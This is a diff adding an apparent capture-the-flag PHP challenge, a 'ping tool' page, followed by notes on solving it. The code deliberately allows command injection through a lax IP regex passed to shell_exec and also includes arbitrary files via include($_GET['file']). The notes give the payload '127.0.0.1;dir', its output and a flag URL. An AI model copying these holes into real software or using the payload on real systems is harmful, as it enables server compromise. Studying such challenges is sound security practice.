@@ -1,0 +1,61 @@
+<?php
+header("Content-type: text/html; charset=utf-8"); 
+?>
+<html>
+<head>
+<title></title>
+</head>
+<body>
+<div align="center">
+	<h1 al>我刚做了一个ping命令的小工具，快试一下吧！</h1>
+
+	<div >
+		<p>请输入目标IP</p>
+		<form name="ping" action="index.php" method="post">
+			<input type="text" name="ip" size="30">
+			<input type="submit" value="submit" name="submit">
+		</form>
+	</div>
+<div>
+</body>
+</html>
+<?php
+if( isset( $_POST[ 'submit' ] ) ) {
+
+	$target = $_REQUEST[ 'ip' ];
+	$len = strlen($target);
+	$i = 0;
+	$wrong = 0;
+	$pattern='/^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}(([&]{2}|[;|])dir[\sa-zA-Z0-9]*)?$/';
+	if(!preg_match($pattern, $target)){
+		$wrong=1;
+	}
+	if($wrong == 0 && $len > 0)
+	{
+		// Determine OS and execute the ping command.
+		if (stristr(php_uname('s'), 'Windows NT')) { 
+	
+			$cmd = shell_exec( 'ping  ' . $target );
+			echo '<pre>'.iconv('GB2312', 'UTF-8',$cmd).'</pre>';
+		
+		} else
+		{ 
+			$cmd = shell_exec( 'ping  -c 3 ' . $target );
+			echo '<pre>'.iconv('GB2312', 'UTF-8',$cmd).'</pre>';
+		}
+	}
+	else
+		echo "输入格式不正确！";
+}
+if( isset($_GET['file']))
+{
+	include($_GET['file']);
+}
+?>
+
+127.0.0.1;dir
+
+1C9976C230DA289C1C359CD2A7C02D48  index.php  index.php.txt
+
+http://101.200.145.44/web2/1C9976C230DA289C1C359CD2A7C02D48/flag.php
+
